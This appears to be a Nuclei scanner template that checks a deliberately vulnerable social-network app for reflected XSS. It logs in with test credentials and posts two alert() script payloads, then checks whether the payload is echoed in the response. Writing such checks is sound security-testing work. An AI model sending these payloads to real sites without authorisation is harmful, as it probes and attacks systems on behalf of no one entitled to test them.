id: vuln-sns-posts-xss-reflected
info:
  name: Vuln SNS Posts - Reflected XSS
  author: claude
  severity: high
  description: |
    Tests for reflected XSS in posts creation response.
  reference:
    - https://owasp.org/www-community/attacks/xss/
  tags: vuln-sns,xss,reflected,posts

http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"user_id":"alice","password":"alice"}
        
      - |
        POST /api/posts HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}
        
        {"content":"{{payload}}"}

    payloads:
      payload:
        - "<script>alert('XSS')</script>"
        - "<img src=x onerror=alert('XSS')>"

    extractors:
      - type: regex
        name: token
        regex:
          - '"token":\s*"([^"]+)"'
        part: body_1
        internal: true

    matchers:
      - type: word
        words:
          - "{{payload}}"
        part: body_2